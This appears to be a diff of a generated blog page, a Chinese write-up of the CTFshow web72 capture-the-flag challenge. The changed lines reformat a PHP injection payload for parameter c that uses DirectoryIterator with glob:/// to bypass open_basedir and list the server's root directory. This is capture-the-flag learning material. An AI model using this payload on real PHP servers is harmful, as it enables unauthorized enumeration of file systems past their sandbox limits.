@@ -90,7 +90,7 @@
 <meta property="og:image" content="http://example.com/2022/01/28/ctfshow-web72/shibai666.png">
 <meta property="og:image" content="http://example.com/2022/01/28/ctfshow-web72/chenggs58.png">
 <meta property="article:published_time" content="2022-01-28T10:24:22.000Z">
-<meta property="article:modified_time" content="2022-01-28T10:53:03.675Z">
+<meta property="article:modified_time" content="2022-02-01T14:06:45.804Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="uaf脚本">
 <meta property="article:tag" content="glob:&#x2F;&#x2F;伪协议">
@@ -367,13 +367,10 @@
 <p>这道题有严格的disable_function限制和open_basedir限制。 </p>
 <p>扫描失败</p>
 <p>先利用glob://伪协议绕过open_basedir，发现根目录下有flag0.txt </p>
-<p>c=?&gt;<?php
-$a=new DirectoryIterator("glob:///*");
-foreach($a as $f)
-{echo($f->__toString().' ');
-}
-exit(0);
-?></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br><span class="line">#记得url编码</span><br></pre></td></tr></table></figure>
+
+
+
 <p><img src="/2022/01/28/ctfshow-web72/QQ%E6%88%AA%E5%9B%BE20220128182935.png" alt="QQ截图20220128182935"></p>
 <p>记得url编码一下</p>
 <p><img src="/2022/01/28/ctfshow-web72/shibai666.png" alt="shibai666"></p>
